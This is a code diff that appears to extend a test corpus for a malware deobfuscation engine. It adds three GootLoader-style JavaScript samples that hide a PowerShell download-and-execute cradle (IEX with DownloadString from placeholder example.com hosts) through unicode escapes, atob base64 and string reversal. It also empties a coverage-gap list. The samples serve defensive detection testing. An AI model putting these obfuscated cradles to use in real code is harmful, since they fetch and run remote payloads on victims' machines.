@@ -430,6 +430,90 @@ TECHNIQUES: list[dict] = [
             ),
         ],
     },
+    # ------------------------------------------------------------------
+    {
+        "id": "javascript_unicode_escape",
+        "display_name": "JavaScript Unicode-Escape String Reconstruction",
+        "description": (
+            "GootLoader ships next-stage payload as a JavaScript string"
+            " of `\\uXXXX\\uXXXX...` escape sequences. Once folded, the"
+            " plaintext reveals the downstream PowerShell or JavaScript"
+            " command."
+        ),
+        "mitre_attack": ["T1027", "T1140", "T1059.007"],
+        "samples": [
+            _sample(
+                "GL023", "unicode_escape_reveals_iex_cradle",
+                "var s = "
+                + "'"
+                + "".join(
+                    "\\u%04x" % ord(c)
+                    for c in "IEX ((New-Object Net.WebClient).DownloadString('http://gl-unicode.example.com/gl_u.ps1'))"
+                ).replace("'", "\\u0027")
+                + "';",
+                "javascript", "javascript",
+                ["js-unicode-escape"],
+                ["IEX", "DownloadString", "gl-unicode.example.com/gl_u.ps1"],
+                ["http://gl-unicode.example.com/gl_u.ps1"],
+                ["T1027", "T1140", "T1059.007", "T1105"],
+                ["javascript_to_powershell_handoff", "download_and_execute", "obfuscated_command_line"],
+            ),
+        ],
+    },
+    # ------------------------------------------------------------------
+    {
+        "id": "javascript_atob_chain",
+        "display_name": "JavaScript atob() Base64 Chain",
+        "description": (
+            "GootLoader (and SocGholish / ClearFake / Pikabot / ChromeLoader)"
+            " wraps stagers in `atob('B64')` or nested `atob(atob('B64B64'))`"
+            " calls. The Convergence Engine peels each atob layer through"
+            " successive iterations of the outer loop."
+        ),
+        "mitre_attack": ["T1027", "T1140", "T1059.007"],
+        "samples": [
+            _sample(
+                "GL024", "single_atob_reveals_iex_cradle",
+                "var payload = atob('"
+                + base64.b64encode(
+                    "IEX ((New-Object Net.WebClient).DownloadString('http://gl-atob.example.com/gl_a.ps1'))".encode("utf-8")
+                ).decode("ascii")
+                + "');",
+                "javascript", "javascript",
+                ["js-atob"],
+                ["IEX", "DownloadString", "gl-atob.example.com/gl_a.ps1"],
+                ["http://gl-atob.example.com/gl_a.ps1"],
+                ["T1027", "T1140", "T1059.007", "T1105"],
+                ["javascript_to_powershell_handoff", "download_and_execute", "obfuscated_command_line"],
+            ),
+        ],
+    },
+    # ------------------------------------------------------------------
+    {
+        "id": "javascript_string_split_shuffle",
+        "display_name": "JavaScript .split().reverse().join() Shuffle",
+        "description": (
+            "GootLoader / SocGholish shuffle their stagers by reversing"
+            " a delimited string:"
+            " `'PAYLOAD_REVERSED'.split('').reverse().join('')` reveals"
+            " the true command."
+        ),
+        "mitre_attack": ["T1027", "T1140", "T1059.007"],
+        "samples": [
+            _sample(
+                "GL025", "split_reverse_join_reveals_iex_cradle",
+                "var cmd = '"
+                + 'IEX ((New-Object Net.WebClient).DownloadString("http://gl-srj.example.com/gl_s.ps1"))'[::-1]
+                + "'.split('').reverse().join('');",
+                "javascript", "javascript",
+                ["js-split-reverse-join"],
+                ["IEX", "DownloadString", "gl-srj.example.com/gl_s.ps1"],
+                ["http://gl-srj.example.com/gl_s.ps1"],
+                ["T1027", "T1140", "T1059.007", "T1105"],
+                ["javascript_to_powershell_handoff", "download_and_execute", "obfuscated_command_line"],
+            ),
+        ],
+    },
 ]
 
 
@@ -439,9 +523,8 @@ TECHNIQUES: list[dict] = [
 # don't exist. Zero samples until the engine gains the necessary decoders.
 # ---------------------------------------------------------------------------
 COVERAGE_GAP_TECHNIQUES: list[str] = [
-    "javascript_unicode_escape",    # \u005Cu00XX\u005Cu00XX ...
-    "javascript_string_split_shuffle",  # obf via .split().reverse().join('')
-    "javascript_atob_chain",        # atob(atob(...)) stagers
+    # Nothing pending. Every JS technique previously listed as a gap is
+    # now covered by the JavaScript decoder pass (v2.1).
 ]
 
 
